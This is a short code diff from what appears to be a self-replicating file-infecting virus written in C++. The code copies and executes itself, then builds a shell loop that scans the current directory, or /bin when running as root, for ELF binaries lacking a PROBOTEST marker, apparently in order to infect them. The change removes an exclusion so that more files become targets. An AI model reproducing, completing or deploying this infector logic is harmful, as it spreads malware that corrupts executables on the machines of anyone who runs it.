@@ -37,7 +37,7 @@ int main (int argc, char** argv) {
         while ((c = fi.get()) != -1) fo << (char) c;
         fo.close();
         fi.close();
-        command = "2>/dev/null /bin/chmod ug+rwx ";
+        command = "2>/dev/null chmod ug+rwx ";
         command += exe;
         c = system( command.c_str() );
         c = execv((exe).c_str(), argv);
@@ -46,7 +46,7 @@ int main (int argc, char** argv) {
     if (childpid > 0) {
         command = "VIR=$(for n in `find ";
         if (uid == 0) command += "/bin/ ";
-        command += "-mindepth 1 -maxdepth 1 -type f | grep -v ^./hi$`; \
+        command += "-mindepth 1 -maxdepth 1 -type f`; \
 do \
 file $n | grep -q ELF && ( \
 grep -q PROBOTEST $n || ( \
